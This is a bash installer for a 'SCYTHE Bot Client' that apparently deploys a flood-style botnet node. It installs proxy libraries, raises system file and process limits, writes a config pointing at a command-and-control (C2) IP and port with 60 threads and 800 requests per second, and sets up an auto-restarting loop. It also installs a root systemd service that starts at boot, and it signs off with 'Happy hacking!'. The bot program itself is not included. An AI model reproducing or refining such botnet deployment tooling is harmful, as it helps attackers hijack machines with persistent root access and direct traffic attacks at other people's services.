#!/bin/bash
# ================================================================
# SCYTHE Bot Client v8.1 — MAXIMIZED & FIXED Auto Installer
# Features: ulimit, systemd, log rotation, proxy support
# FIXED: Directory creation, dependency verification, clean code
# ================================================================

set -e

# ========== COLOR CODES ==========
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# ========== CONFIG ==========
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

# ========== FUNCTIONS ==========

print_banner() {
    echo -e "${CYAN}"
    echo "  ███████╗ ██████╗██╗   ██╗████████╗██╗  ██╗███████╗"
    echo "  ██╔════╝██╔════╝╚██╗ ██╔╝╚══██╔══╝██║  ██║██╔════╝"
    echo "  ███████╗██║      ╚████╔╝    ██║   ███████║█████╗  "
    echo "  ╚════██║██║       ╚██╔╝     ██║   ██╔══██║██╔══╝  "
    echo "  ███████║╚██████╗   ██║      ██║   ██║  ██║███████╗"
    echo "  ╚══════╝ ╚═════╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝╚══════╝"
    echo -e "${NC}"
    echo -e "${BOLD}${GREEN}  SCYTHE Bot Client v8.1 — MAXIMIZED${NC}"
    echo -e "${CYAN}  ⚡ 60 Threads | 800 RPS | Proxy-First | 12H Stable${NC}"
    echo -e "${CYAN}  🔒 Auto-Directory | Graceful Deps | Smart Reconnect${NC}"
    echo ""
}

check_root() {
    echo -e "${YELLOW}🔍 Checking privileges...${NC}"
    if [[ "$EUID" -ne 0 ]]; then
        echo -e "${YELLOW}⚠️  Not running as root. Some features may fail.${NC}"
        echo -e "${YELLOW}   Recommend: sudo ./installbot.sh${NC}"
        sleep 2
    else
        echo -e "${GREEN}✅ Running as root.${NC}"
    fi
}

check_os() {
    echo -e "${YELLOW}🔍 Checking OS...${NC}"
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        OS="linux"
        if [ -f /etc/os-release ]; then
            . /etc/os-release
            echo -e "${GREEN}✅ Linux detected: $NAME $VERSION_ID${NC}"
        else
            echo -e "${GREEN}✅ Linux detected.${NC}"
        fi
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        OS="macos"
        echo -e "${GREEN}✅ macOS detected.${NC}"
    else
        echo -e "${RED}❌ Unsupported OS: $OSTYPE${NC}"
        exit 1
    fi
}

check_python() {
    echo -e "${YELLOW}🔍 Checking Python...${NC}"
    if ! command -v python3 &> /dev/null; then
        echo -e "${RED}❌ Python3 not found. Installing...${NC}"
        if [[ "$OS" == "linux" ]]; then
            if command -v apt &> /dev/null; then
                apt update -y && apt install -y python3 python3-pip python3-venv
            elif command -v yum &> /dev/null; then
                yum install -y python3 python3-pip
            elif command -v dnf &> /dev/null; then
                dnf install -y python3 python3-pip
            else
                echo -e "${RED}❌ Cannot install Python automatically.${NC}"
                exit 1
            fi
        fi
    fi
    PYTHON_VER=$(python3 -c 'import sys; print(f"{sys.version_info.major}.{sys.version_info.minor}")')
    echo -e "${GREEN}✅ Python $PYTHON_VER detected.${NC}"
    if python3 -c "import sys; exit(0 if sys.version_info >= (3,10) else 1)"; then
        echo -e "${GREEN}✅ Python version OK (3.10+).${NC}"
    else
        echo -e "${RED}❌ Python $PYTHON_VER is too old. Need 3.10+${NC}"
        exit 1
    fi
}

install_system_packages() {
    echo -e "${YELLOW}📦 Installing system packages...${NC}"
    if [[ "$OS" == "linux" ]]; then
        if command -v apt &> /dev/null; then
            apt update -y
            apt install -y python3-venv python3-pip bc
        elif command -v yum &> /dev/null; then
            yum install -y python3 python3-pip bc
        elif command -v dnf &> /dev/null; then
            dnf install -y python3 python3-pip bc
        else
            echo -e "${YELLOW}⚠️  Cannot install packages automatically.${NC}"
        fi
    fi
    echo -e "${GREEN}✅ System packages installed.${NC}"
}

setup_ulimit() {
    echo -e "${YELLOW}🔧 Setting up ulimit...${NC}"
    CURRENT_NOFILE=$(ulimit -n)
    CURRENT_NPROC=$(ulimit -u)
    echo -e "   Current ulimit -n: ${CYAN}$CURRENT_NOFILE${NC}"
    echo -e "   Current ulimit -u: ${CYAN}$CURRENT_NPROC${NC}"

    ulimit -n 65535 2>/dev/null || true
    ulimit -u 65535 2>/dev/null || true

    if [[ "$EUID" -eq 0 ]]; then
        LIMITS_FILE="/etc/security/limits.conf"
        if [ -f "$LIMITS_FILE" ]; then
            cp "$LIMITS_FILE" "$LIMITS_FILE.bak.$(date +%s)" 2>/dev/null || true
        fi
        if ! grep -q "soft nofile 65535" "$LIMITS_FILE" 2>/dev/null; then
            echo "* soft nofile 65535" >> "$LIMITS_FILE"
            echo "* hard nofile 65535" >> "$LIMITS_FILE"
            echo "root soft nofile 65535" >> "$LIMITS_FILE"
            echo "root hard nofile 65535" >> "$LIMITS_FILE"
            echo -e "${GREEN}✅ Permanent ulimit set${NC}"
        else
            echo -e "${GREEN}✅ Permanent ulimit already configured.${NC}"
        fi
    fi
    echo -e "   New ulimit -n: ${GREEN}$(ulimit -n)${NC}"
    echo -e "   New ulimit -u: ${GREEN}$(ulimit -u)${NC}"
}

create_dirs() {
    echo -e "${YELLOW}📦 Creating directories...${NC}"
    mkdir -p logs data
    echo -e "${GREEN}✅ Directories created (logs/, data/)${NC}"
}

create_venv() {
    echo -e "${YELLOW}📦 Setting up virtual environment...${NC}"
    if [ -d "venv" ]; then
        echo -e "${YELLOW}⚠️  venv exists. Removing old...${NC}"
        rm -rf venv
    fi
    python3 -m venv venv
    source venv/bin/activate
    echo -e "${GREEN}✅ Virtual environment created.${NC}"
}

create_requirements() {
    echo -e "${YELLOW}📝 Creating requirements.txt...${NC}"
    cat > requirements.txt <<'EOF'
requests>=2.31.0
urllib3>=2.0.0
psutil>=5.9.0
PySocks>=1.7.1
EOF
    echo -e "${GREEN}✅ requirements.txt created.${NC}"
}

install_requirements() {
    echo -e "${YELLOW}📦 Installing Python dependencies...${NC}"
    if [ ! -f "requirements.txt" ]; then
        create_requirements
    fi
    source venv/bin/activate
    pip install --upgrade pip setuptools wheel -q
    pip install -r requirements.txt -q

    echo -e "${YELLOW}🔍 Verifying dependencies...${NC}"
    python3 -c "import requests; print('requests OK')" || pip install requests[socks] -q
    python3 -c "import psutil; print('psutil OK')" || pip install psutil -q
    python3 -c "import socks; print('PySocks OK')" || pip install PySocks -q

    echo -e "${GREEN}✅ Dependencies installed and verified${NC}"
}

configure_bot() {
    echo -e "${YELLOW}🔧 Configuring bot...${NC}"
    C2_IP=${1:-"127.0.0.1"}
    C2_PORT=${2:-4884}
    BOT_ID=${3:-$(hostname)}
    THREADS=${4:-60}
    RPS_LIMIT=${5:-800}

    cat > config.ini <<EOF
[C2]
IP = $C2_IP
PORT = $C2_PORT
ID = $BOT_ID
THREADS = $THREADS
RPS_LIMIT = $RPS_LIMIT
BANDWIDTH_LIMIT_MB = 0
EOF
    echo -e "${GREEN}✅ config.ini created.${NC}"
    echo -e "   C2 IP      : ${CYAN}$C2_IP${NC}"
    echo -e "   Port       : ${CYAN}$C2_PORT${NC}"
    echo -e "   Bot ID     : ${CYAN}$BOT_ID${NC}"
    echo -e "   Threads    : ${CYAN}$THREADS${NC}"
    echo -e "   RPS Limit  : ${CYAN}$RPS_LIMIT${NC}"
}

create_start_script() {
    echo -e "${YELLOW}📝 Creating start.sh...${NC}"
    cat > start.sh <<'EOF'
#!/bin/bash
cd "$(dirname "$0")"
while true; do
    source venv/bin/activate
    python3 bot.py "$@"
    EXIT_CODE=$?
    if [ $EXIT_CODE -eq 0 ]; then
        echo "Bot exited normally. Restarting in 5s..."
    else
        echo "Bot crashed (code $EXIT_CODE). Restarting in 5s..."
    fi
    sleep 5
done
EOF
    chmod +x start.sh
    echo -e "${GREEN}✅ start.sh created.${NC}"
}

create_systemd_service() {
    echo -e "${YELLOW}🔧 Creating systemd service...${NC}"
    if [[ "$EUID" -ne 0 ]]; then
        echo -e "${YELLOW}⚠️  Skipping systemd (not root).${NC}"
        return
    fi

    SERVICE_NAME="scythe-bot"
    SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"

    cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=SCYTHE Bot Client
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$SCRIPT_DIR
ExecStart=$SCRIPT_DIR/venv/bin/python3 $SCRIPT_DIR/bot.py
Restart=always
RestartSec=5
StandardOutput=append:$SCRIPT_DIR/logs/bot.log
StandardError=append:$SCRIPT_DIR/logs/bot.log

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME" 2>/dev/null || true
    echo -e "${GREEN}✅ Systemd service: $SERVICE_NAME${NC}"
    echo -e "   Start: ${CYAN}systemctl start $SERVICE_NAME${NC}"
    echo -e "   Stop:  ${CYAN}systemctl stop $SERVICE_NAME${NC}"
    echo -e "   Logs:  ${CYAN}journalctl -u $SERVICE_NAME -f${NC}"
}

show_success() {
    echo ""
    echo -e "${GREEN}${BOLD}✅ Installation complete!${NC}"
    echo ""
    echo -e "${CYAN}=========================================${NC}"
    echo -e "${BOLD}🚀 Next steps:${NC}"
    echo ""
    echo -e "  ${BOLD}Quick Start:${NC}"
    echo -e "     ${YELLOW}./start.sh${NC}"
    echo ""
    echo -e "  ${BOLD}Run with C2 IP:${NC}"
    echo -e "     ${YELLOW}source venv/bin/activate${NC}"
    echo -e "     ${YELLOW}python3 bot.py <C2_IP> 4884 <BOT_ID>${NC}"
    echo ""
    echo -e "  ${BOLD}Systemd:${NC}"
    echo -e "     ${YELLOW}systemctl start scythe-bot${NC}"
    echo ""
    echo -e "  ${BOLD}Logs:${NC}"
    echo -e "     ${YELLOW}tail -f logs/bot.log${NC}"
    echo ""
    echo -e "${CYAN}=========================================${NC}"
    echo -e "${GREEN}Happy hacking! 🔥${NC}"
}

# ========== MAIN ==========
print_banner
check_root
check_os
check_python
install_system_packages
setup_ulimit
create_dirs
create_venv
create_requirements
install_requirements
configure_bot "$@"
create_start_script
create_systemd_service
show_success